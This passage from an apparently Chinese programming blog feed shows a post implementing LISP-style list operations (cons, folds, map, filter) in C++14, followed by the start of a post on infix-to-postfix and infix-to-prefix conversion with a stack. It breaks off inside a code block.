<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>当时在学《SICP》的时候，突发奇想，看用Scheme(LISP方言的一种)来写C++寒假作业是什么效果。不出意料，实在是太好写了。有了函数式的“我手写我心”加成，短短几十行就把C++寒假作业给搞定了。</p>
<p>既然作业已经完成了，再重新用C++的命令式思路来做，显然太浪费精力和时间。于是萌生出了这么一个想法：何不尝试让C++去适应我的思路，让我写出函数式风格的C++作业呢？</p>
<p>要完成这个工作，首先要模仿LISP简单的结构和功能，本文就是用来解决这个问题。</p>
<hr>
<h1 id="基础结构"><a href="#基础结构" class="headerlink" title="基础结构"></a>基础结构</h1><p>众所周知，LISP这个名字其实是来自于 “LISt Processor” —— “ list 处理器”。所谓的<code>list</code>，是如下的这么一个东西：</p>
<p><img src="/images/180303/photo_2018-03-03_17-53-22.jpg"></p>
<p>前一个盒子连着后一个盒子，第一个盒子有箭头指着，最后一个盒子什么都不指，用斜线填充。</p>
<p>用C++来表达这样的结构是很轻松的事情，每个盒子(<code>Node</code>)包含元素部分，类型为<code>A</code>(<code>Arbitrary</code>)，还有箭头部分，类型为<code>std::shared_ptr&lt;A&gt;</code> (注：<code>std::shared_ptr</code>可以使我们从内存管理的泥潭中抽身而出)。可以通过调用内部的<code>head</code>、<code>tail</code>函数来获取该元素，以及箭头。代码如下：</p>
<p>(*注：以下所有C++代码均采用C++14标准)</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyNode</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"><span class="keyword">public</span>:</div><div class="line">  MyNode(T a, <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;MyNode&gt; b) : n(a), next(b)&#123;&#125;;</div><div class="line"></div><div class="line">  <span class="function">T <span class="title">head</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> n; &#125;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;MyNode&gt; tail() &#123; <span class="keyword">return</span> next; &#125;</div><div class="line"></div><div class="line"><span class="keyword">private</span>:</div><div class="line">  T n;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;MyNode&gt; next;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>初步的结构有了，但请注意到，<code>list</code>是一种递归的结构，我取出某个<code>list</code>的<code>tail</code>(箭头)，它仍然是一个<code>list</code>，直到最后代表<code>list</code>完结的斜线。</p>
<p>所以，在这里我干脆把所有箭头都取相同的名字，叫做<code>Mylist</code>，给最后的斜线也取个名字，叫做<code>EmptyList</code>，规定<code>EmptyList</code>也是一个<code>list</code>。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="keyword">using</span> MyList = <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;MyNode&lt;T&gt;&gt;;</div><div class="line"></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line">MyList&lt;T&gt; EmptyList = <span class="literal">nullptr</span>;</div></pre></td></tr></table></figure>
<hr>
<h1 id="基础函数"><a href="#基础函数" class="headerlink" title="基础函数"></a>基础函数</h1><h2 id="构造-LIST"><a href="#构造-LIST" class="headerlink" title="构造 LIST"></a>构造 LIST</h2><p>上面说过，<code>list</code>是一种递归的结构，所以构造<code>list</code>的方法很简单：给定一个元素<code>x</code>，再一个<code>list</code>，就可以构造一个新的<code>list</code>。这个新<code>list</code>的<code>head</code>是<code>x</code>，<code>tail</code>是旧<code>list</code>，相当于旧<code>list</code>往最前面再长了一个盒子。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * 构造List的基础函数</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line">MyList&lt;T&gt; Cons(T x, MyList&lt;T&gt; xs)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::make_shared&lt;MyNode&lt;T&gt;&gt;(x, xs);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// auto list3 = Cons(3, EmptyList&lt;int&gt;); </span></div><div class="line"><span class="comment">// =&gt; (3)</span></div><div class="line"><span class="comment">// auto list23 = Cons(2, list3); </span></div><div class="line"><span class="comment">// =&gt; (2, 3)</span></div><div class="line"><span class="comment">// auto list123 = Cons(1, list23); </span></div><div class="line"><span class="comment">// =&gt; (1, 2, 3)</span></div></pre></td></tr></table></figure></p>
<p>每次都从斜线开始一个个盒子地构造<code>list</code>确实有点辛苦，所以我这里写了一个语法糖，让自己可以以轻松又易读的方式构造<code>list</code>：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * 构造List的语法糖</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line">MyList&lt;T&gt; toList(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">initializer_list</span>&lt;T&gt; &amp;il)</div><div class="line">&#123;</div><div class="line">  MyList&lt;T&gt; res = EmptyList&lt;T&gt;;</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> it = <span class="built_in">std</span>::rbegin(il); it != <span class="built_in">std</span>::rend(il); ++it)</div><div class="line">    res = Cons(*it, res);</div><div class="line">  <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// auto list123_ = Cons(1, Cons(2, Cons(3, EmtpyList&lt;int&gt;))); </span></div><div class="line"><span class="comment">// =&gt; (1, 2, 3)</span></div><div class="line"><span class="comment">// auto list123__ = toList(&#123;1, 2, 3&#125;); </span></div><div class="line"><span class="comment">// =&gt; (1, 2, 3)</span></div></pre></td></tr></table></figure></p>
<hr>
<h2 id="左右折叠函数"><a href="#左右折叠函数" class="headerlink" title="左右折叠函数"></a>左右折叠函数</h2><p>由于函数式语言里并没有常规命令式语言里面的循环语句，使得函数式语言的程序员们通常会采用递归式对<code>list</code>进行遍历操作。而遍历操作又如此地常见，于是有人抽象出了最常见的两种遍历方式，一种是<code>fold left</code>，一种是<code>fold right</code>。它们可以让程序员不必显式地写出递归式，只需要提供：</p>
<ul>
<li>对 <code>单个元素</code> 和 <code>已成功处理的结果</code> 之间操作的函数。</li>
<li>初始结果。</li>
<li>待处理<code>list</code>。</li>
</ul>
<p>便可以通过折叠(fold)函数将<code>list</code>折叠成期望的结构。</p>
<p>例如求和操作：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">auto</span> lst = toList(&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;);</div><div class="line"></div><div class="line"><span class="keyword">auto</span> a = FoldLeft([](<span class="keyword">int</span> res, <span class="keyword">int</span> x) &#123; <span class="keyword">return</span> x + res; &#125;, <span class="number">0</span>, lst);</div><div class="line"><span class="comment">// a = 6</span></div><div class="line"></div><div class="line"><span class="keyword">auto</span> b = FoldRight([](<span class="keyword">int</span> x, <span class="keyword">int</span> res) &#123; <span class="keyword">return</span> x + res; &#125;, <span class="number">0</span>, lst);</div><div class="line"><span class="comment">// b = 6</span></div></pre></td></tr></table></figure></p>
<p>对于求和操作，<code>fold left</code>和<code>fold right</code>都能求出结果，但求值的方式是有所不同：他们的求值结构和顺序是不同的。这里不详细解释他们之间的不同之处，有兴趣可以查阅维基百科：<a href="https://en.wikipedia.org/wiki/Fold_(higher-order_function" target="_blank" rel="external">https://en.wikipedia.org/wiki/Fold_(higher-order_function</a>)</p>
<p>将左右折叠写成C++的形式：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * 左右折叠函数</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> F, <span class="keyword">typename</span> Z, <span class="keyword">typename</span> T&gt;</div><div class="line"><span class="function">Z <span class="title">FoldRight</span><span class="params">(F fn, Z zero, MyList&lt;T&gt; xs)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> (xs == EmptyList&lt;T&gt;)</div><div class="line">    <span class="keyword">return</span> zero;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="keyword">return</span> fn(xs-&gt;head(), FoldRight(fn, zero, xs-&gt;tail()));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> F, <span class="keyword">typename</span> Z, <span class="keyword">typename</span> T&gt;</div><div class="line"><span class="function">Z <span class="title">FoldLeft</span><span class="params">(F fn, Z zero, MyList&lt;T&gt; xs)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">if</span> (xs == EmptyList&lt;T&gt;)</div><div class="line">    <span class="keyword">return</span> zero;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    <span class="keyword">return</span> FoldLeft(fn, fn(zero, xs-&gt;head()), xs-&gt;tail());</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看出他们实际上都是递归式。</p>
<hr>
<h2 id="翻转-list"><a href="#翻转-list" class="headerlink" title="翻转 list"></a>翻转 list</h2><p>由于上面已经实现了左右折叠函数，在这里可以直接现用了，因为翻转<code>list</code>也不过是个遍历操作。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * 反转</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line">MyList&lt;T&gt; Reverse(MyList&lt;T&gt; xs)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> FoldLeft([](MyList&lt;T&gt; xs, T x) -&gt; MyList&lt;T&gt; &#123; <span class="keyword">return</span> Cons&lt;T&gt;(x, xs); &#125; , </div><div class="line">                  EmptyList&lt;T&gt;, xs);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>相信读者已经看出了函数式语句是何等的简洁了，我上面所实现的函数全都不过寥寥几行，却已经完整表达了我所期望的操作。</p>
<hr>
<h2 id="list-长度"><a href="#list-长度" class="headerlink" title="list 长度"></a>list 长度</h2><p>不出意外，一样是可以通过<code>fold</code>解决。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * Length</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line"><span class="keyword">size_t</span> Length(MyList&lt;T&gt; xs)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> FoldLeft( [](<span class="keyword">size_t</span> x, T rest) &#123; <span class="keyword">return</span> (x + <span class="number">1</span>); &#125;,</div><div class="line">                   <span class="number">0</span>, xs);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="Map-函数"><a href="#Map-函数" class="headerlink" title="Map 函数"></a>Map 函数</h2><p>这里的<code>Map</code>和<code>hash table</code>所表达的<code>Map</code>含义不同。这里只是指：提供一个将<code>list</code>元素映射到另外一个元素的函数，通过遍历<code>list</code>的每个元素，将原有的<code>list</code>映射到另外一个相同长度的<code>list</code>。</p>
<p><code>fold</code>函数再次出场：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * Map</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T, <span class="keyword">typename</span> F&gt;</div><div class="line">MyList&lt;T&gt; PoorMap(F fn, MyList&lt;T&gt; xs)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> FoldRight([&amp;fn](T x, MyList&lt;T&gt; xs) -&gt; MyList&lt;T&gt; &#123; <span class="keyword">return</span> Cons&lt;T&gt;(fn(x), xs); &#125;,</div><div class="line">                   EmptyList&lt;T&gt;, xs);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里需要解释的是，真正的<code>Map</code>函数是可以将一种类型映射到另外一种类型的，这里只能是相同类型之间的映射，所以我称为<code>PoorMap</code>。原因是，以我的能力，要写可以映射到另外一种类型的<code>Map</code>，用户代码将变得丑陋。不得已，我牺牲了功能完备性，保留了简洁性。用户代码若需要映射到另外一种类型时，我将临时使用<code>for</code>循环代替。</p>
<hr>
<h2 id="过滤器函数"><a href="#过滤器函数" class="headerlink" title="过滤器函数"></a>过滤器函数</h2><p>提供一个判断条件，和一个<code>list</code>，可以将不符合条件的元素去除。</p>
<p><code>fold</code>之舞：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * Filter</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> F, <span class="keyword">typename</span> T&gt;</div><div class="line">MyList&lt;T&gt; Filter(F fn, MyList&lt;T&gt; xs)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> FoldRight([&amp;fn](T x, MyList&lt;T&gt; xs) -&gt; MyList&lt;T&gt; &#123; <span class="keyword">return</span> (fn(x) ? Cons&lt;T&gt;(x, xs) : xs); &#125;,</div><div class="line">                   EmptyList&lt;T&gt;, xs);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><h3 id="取list前n个元素，构成新list"><a href="#取list前n个元素，构成新list" class="headerlink" title="取list前n个元素，构成新list"></a>取list前n个元素，构成新list</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * list-head</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line">MyList&lt;T&gt; ListHead(MyList&lt;T&gt; xs, <span class="keyword">size_t</span> n)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> ( n == <span class="number">0</span> ) ? EmptyList&lt;T&gt; : Cons(xs-&gt;head(), ListHead(xs-&gt;tail(), n - <span class="number">1</span>)) ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="丢弃list前n个元素，构成新list"><a href="#丢弃list前n个元素，构成新list" class="headerlink" title="丢弃list前n个元素，构成新list"></a>丢弃list前n个元素，构成新list</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * list-tail</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</div><div class="line">MyList&lt;T&gt; ListTail(MyList&lt;T&gt; xs, <span class="keyword">size_t</span> n)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">return</span> ( n == <span class="number">0</span> ) ? xs : ListTail(xs-&gt;tail(), n - <span class="number">1</span>) ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="list-里是否存在符合条件的元素"><a href="#list-里是否存在符合条件的元素" class="headerlink" title="list 里是否存在符合条件的元素"></a>list 里是否存在符合条件的元素</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// * any</span></div><div class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> F, <span class="keyword">typename</span> T&gt;</div><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Any</span><span class="params">(F pred, MyList&lt;T&gt; lst)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">return</span> FoldLeft( [&amp;pred](<span class="keyword">bool</span> x, T rest) &#123; <span class="keyword">return</span> pred(rest) || x; &#125;, </div><div class="line">                   <span class="literal">false</span>, lst);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<hr>
<p>基础结构和功能已经构造完毕，下面将用来……完成作业。<br>完整代码：<a href="https://github.com/zhongzc/C-/blob/master/mylist.h" target="_blank" rel="external">https://github.com/zhongzc/C-/blob/master/mylist.h</a></p>
<hr>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LISP赐予我力量。&lt;/p&gt;
    
    </summary>
    
      <category term="编程" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/categories/%E7%BC%96%E7%A8%8B/C/"/>
    
    
      <category term="编程" scheme="http://gaufoo.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="C++" scheme="http://gaufoo.com/tags/C/"/>
    
      <category term="LISP" scheme="http://gaufoo.com/tags/LISP/"/>
    
      <category term="函数式编程" scheme="http://gaufoo.com/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>中缀表达式转化前后缀引发的思考</title>
    <link href="http://gaufoo.com/2018/01/02/ni_to_pre_post/"/>
    <id>http://gaufoo.com/2018/01/02/ni_to_pre_post/</id>
    <published>2018-01-02T06:22:22.000Z</published>
    <updated>2018-01-02T02:51:53.334Z</updated>
    
    <content type="html"><![CDATA[<p>纠结星人的胜利。</p>
<a id="more"></a>
<hr>
<h1 id="平凡栈实现"><a href="#平凡栈实现" class="headerlink" title="平凡栈实现"></a>平凡栈实现</h1><p>一谈起中缀表达式转前后缀表达式，网上的解决办法中，有一大半是用栈实现，我称之为平凡实现。因为这种方法总让我感觉是在头痛医头、脚痛医脚，拓展性不大。下面来看看。</p>
<hr>
<h2 id="中缀表达式转后缀表达式"><a href="#中缀表达式转后缀表达式" class="headerlink" title="中缀表达式转后缀表达式"></a>中缀表达式转后缀表达式</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>请原谅我很难把道理讲透，只能说说做法。大体上来看就是让操作符入栈，通过比较读取到的操作符和栈顶操作符优先级，进行入栈和出栈。</p>
<ol>
<li>遇到操作数直接输出</li>
<li>遇到<strong>左</strong>括号，<strong>左</strong>括号入栈</li>
<li>遇到<strong>右</strong>括号，将pop到<strong>左</strong>括号为止</li>
<li>遇到操作符，把<strong>小于等于</strong>它优先级的操作符都出栈，直到<strong>左</strong>括号或者栈<strong>空</strong>，最后让它入栈</li>
<li>读取完表达式，将栈全部pop</li>
</ol>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">^</div><div class="line">output: 1        </div><div class="line">stack:</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4     </div><div class="line">  ^</div><div class="line">output: 1       </div><div class="line">stack: -</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">    ^     </div><div class="line">// 左括号入栈</div><div class="line">output: 1</div><div class="line">stack: - (</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">      ^</div><div class="line">output: 1 3      </div><div class="line">stack: - (</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">        ^</div><div class="line">output: 1 3      </div><div class="line">stack: - ( *</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">          ^</div><div class="line">output: 1 3 2  </div><div class="line">stack: - ( *</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">            ^</div><div class="line">// 栈顶是*，-优先级比它小，*输出，-入栈</div><div class="line">output: 1 3 2 *     </div><div class="line">stack: - ( -</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">              ^</div><div class="line">output: 1 3 2 * 5     </div><div class="line">stack: - ( -</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">                ^</div><div class="line">// 遇到右括号，pop到左括号</div><div class="line">output: 1 3 2 * 5 -    </div><div class="line">stack: -</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">                  ^</div><div class="line">output: 1 3 2 * 5 - </div><div class="line">stack: - *</div><div class="line"></div><div class="line">1 - ( 3 * 2 - 5 ) * 4</div><div class="line">                    ^</div><div class="line">output: 1 3 2 * 5 - 4</div><div class="line">stack: - *</div><div class="line"></div><div class="line"></div><div class="line">// 最后全部pop</div><div class="line">output: 1 3 2 * 5 - 4 * -</div><div class="line">stack:</div></pre></td></tr></table></figure>
<h3 id="主要代码"><a href="#主要代码" class="headerlink" title="主要代码"></a>主要代码</h3><p>数据结构：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">enum</span> OP_TYPE &#123; OP_NUM, OP_SYMBOL, OP_ADD, OP_SUB, OP_MUL, OP_DIV, OP_LBAC, OP_RBAC, &#125;;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Token</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    OP_TYPE _type;</div><div class="line">    <span class="keyword">int</span> _value;</div><div class="line"></div><div class="line">    Token(<span class="keyword">int</span> v) : _type(OP_NUM), _value(v) &#123;&#125;</div><div class="line">    Token(<span class="keyword">char</span> c) : _type(OP_SYMBOL), _value(CharToOp(c)) &#123;&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>实现代码：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">NiToPost</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; &amp;nifix, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; &amp;post)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="built_in">std</span>::<span class="built_in">stack</span>&lt;Token&gt; stk;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp;i : nifix)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (i._type == OP_NUM)</div><div class="line">        &#123;</div><div class="line">            post.push_back(i);</div><div class="line">        &#125;   <span class="comment">// 操作数直接输出</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">auto</span> iv = i._value;</div><div class="line">            <span class="keyword">if</span> (iv == OP_LBAC)</div><div class="line">            &#123;</div><div class="line">                stk.push(i);</div><div class="line">            &#125;   <span class="comment">// 左括号直接入栈</span></div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (iv == OP_RBAC)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">while</span> (stk.top()._value != OP_LBAC)</div><div class="line">                &#123;</div><div class="line">                    post.push_back(stk.top());</div><div class="line">                    stk.pop();</div><div class="line">                &#125;</div><div class="line">                stk.pop();</div><div class="line">            &#125;   <span class="comment">// 右括号，pop到左括号</span></div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                <span class="keyword">while</span> (!stk.empty() &amp;&amp; stk.top()._value != OP_LBAC &amp;&amp; CalcPriority(i) &lt;= CalcPriority(stk.top()))</div><div class="line">                &#123;</div><div class="line">                    post.push_back(stk.top());</div><div class="line">                    stk.pop();</div><div class="line">                &#125;</div><div class="line">                stk.push(i);</div><div class="line">            &#125;   <span class="comment">// 遇到操作符，把小于等于它优先级的操作符都出栈，直到左括号或者栈空，最后让它入栈</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">while</span> (!stk.empty())</div><div class="line">    &#123;</div><div class="line">        post.push_back(stk.top());</div><div class="line">        stk.pop();</div><div class="line">    &#125;   <span class="comment">// 读取完表达式，将栈全部pop</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<hr>
<h2 id="中缀表达式转前缀表达式"><a href="#中缀表达式转前缀表达式" class="headerlink" title="中缀表达式转前缀表达式"></a>中缀表达式转前缀表达式</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>和转后缀很接近，但是稍麻烦些，需要从后往前读取，最后再翻转过来。而且优先级的比较和转后缀也有所不同，转后缀是小于等于，这里是小于。</p>
<ol>
<li>从后向前读取表达式</li>
<li>遇到操作数直接输出</li>
<li>遇到<strong>右</strong>括号，<strong>右</strong>括号入栈</li>
<li>遇到<strong>左</strong>括号，将pop到<strong>右</strong>括号为止</li>
<li>遇到操作符，把<strong>小于</strong>它优先级的操作符都出栈，直到<strong>右</strong>括号或者栈<strong>空</strong>，最后让它入栈</li>
<li>读取完表达式，将栈全部pop</li>
<li>逆序输出</li>
</ol>
<h3 id="主要代码-1"><a href="#主要代码-1" class="headerlink" title="主要代码"></a>主要代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div 